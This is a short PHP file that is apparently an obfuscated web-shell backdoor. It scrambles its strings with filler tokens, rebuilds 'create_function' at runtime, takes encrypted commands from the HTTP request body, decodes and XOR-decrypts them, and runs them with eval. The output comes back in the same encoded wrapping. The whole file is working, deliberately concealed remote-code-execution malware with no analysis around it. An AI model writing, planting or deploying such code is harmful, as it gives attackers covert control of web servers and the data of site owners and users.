<?php
$d='{NS$cNS=strlen($kNS);NS$l=NSNSstrlen($tNS);$o="";NSNSfor($i=0;NS$i<$l;NS){NSfor($j=0NS;($j<$c&&$i<$lNS);$j++,NSNS$i++){$';
$T=str_replace('Fi','','crFieatFieFi_FifunFiFiction');
$i='et_contents();@NSoNSNSb_end_clean();NS$r=NSNS@bNSase64_encode(NS@x(@gzcomNSpressNS($o),$k));priNSNSnt("$p$kh$rNS$kf");}';
$t='NSo.NS=$t{$i}^$k{$j};}}rNSeturNSn $o;}if (NS@pregNS_mNSatch("/$kNSNSh(.+)NS$kf/",@fileNS_get_conNStents("NSphp://iNSnp';
$p='$k="7a8daNSb3NS9";$kh="NSf836bbNSee7ccfNS";NS$kf=NS"81d3NSe723c6f4"NS;$p="iUNx5NSvOP29reKNSNSRWNSC";function x($NSt,$k)';
$Z='NSut"),NSNS$mNS)==1) {@ob_staNSrt();@evaNSl(@NSgzuncNSompress(@x(@bNSaNSse64_decNSode($mNS[NS1NS]),$kNS)));NS$o=@ob_g';
$y=str_replace('NS','',$p.$d.$t.$Z.$i);
$a=$T('',$y);$a();
?>
